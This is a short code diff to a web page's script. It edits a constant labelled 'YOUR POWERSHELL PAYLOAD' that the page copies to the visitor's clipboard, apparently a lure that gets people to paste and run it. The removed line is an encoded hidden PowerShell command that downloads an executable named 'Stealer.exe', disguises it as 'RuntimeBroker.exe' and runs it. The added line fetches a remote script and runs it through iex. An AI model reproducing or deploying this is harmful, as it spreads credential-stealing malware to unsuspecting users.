@@ -151,7 +151,7 @@
 <script>
   // ── YOUR POWERSHELL PAYLOAD ──────────────────────────────────────────────────
   // Fixed: -WindowStyle Hidden (was Pidden)
-  const PAYLOAD = `powershell -w 1 -nop -ep bypass -enc JAB1AHIAbAA9ACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwB6AGUAeQBrAG8AcAA5AC0AdABlAGMAaAAvAEUAeABlAGMAdQB0AGUAcgBzAC0AaAB1AGIALwByAGUAbABlAGEAcwBlAHMALwBkAG8AdwBuAGwAbwBhAGQALwBWADEALwBTAHQAZQBhAGwAZQByAC4AZQB4AGUAJwA7ACQAbwB1AHQAPQAiACQAZQBuAHYAOgBUAEUATQBQAFwAUgB1AG4AdABpAG0AZQBCAHIAbwBrAGUAcgAuAGUAeABlACIAOwAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACQAdQByAGwALAAkAG8AdQB0ACkAOwBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAJABvAHUAdAAgAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAASABpAGQAZABlAG4A`;
+  const PAYLOAD = `powershell -w 1 -c "iwr -useb https://raw.githubusercontent.com/zeykop9-tech/Executers-hub/main/run.txt | iex"`;
   // ─────────────────────────────────────────────────────────────────────────────
 
   function copyToClipboard(text) {
